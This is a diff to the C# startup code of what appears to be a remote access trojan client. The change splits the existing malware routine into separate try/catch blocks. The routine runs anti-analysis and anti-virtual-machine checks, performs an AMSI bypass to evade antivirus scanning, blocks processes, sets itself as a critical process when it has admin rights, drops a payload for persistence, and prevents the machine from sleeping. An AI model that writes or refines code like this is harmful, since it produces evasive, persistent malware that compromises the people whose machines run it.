@@ -16,24 +16,43 @@ namespace Client
             }
 
             if (!Settings.InitializeSettings()) Environment.Exit(0);
-
             try
             {
+                
                 if (Convert.ToBoolean(Settings.An_ti)) //run anti-virtual environment
                     Anti_Analysis.RunAntiAnalysis();
+            }
+            catch { }
+            A.B();//Amsi Bypass
+            try
+            {
                 if (!MutexControl.CreateMutex()) //if current payload is a duplicate
                     Environment.Exit(0);
+            }
+            catch { }
+            try
+            {
                 if (Convert.ToBoolean(Settings.Anti_Process)) //run AntiProcess
                     AntiProcess.StartBlock();
+            }
+            catch { }
+            try
+            {
                 if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin()) //active critical process
                     ProcessCritical.Set();
+            }
+            catch { }
+            try
+            {
                 if (Convert.ToBoolean(Settings.In_stall)) //drop payload [persistence]
                     NormalStartup.Install();
-                Methods.PreventSleep(); //prevent pc to idle\sleep
-                
+            }
+            catch { }
+            Methods.PreventSleep(); //prevent pc to idle\sleep
+            try
+            {
                 if (Methods.IsAdmin())
                     Methods.ClearSetting();
-                A.B();//Amsi Bypass
             }
             catch { }
 
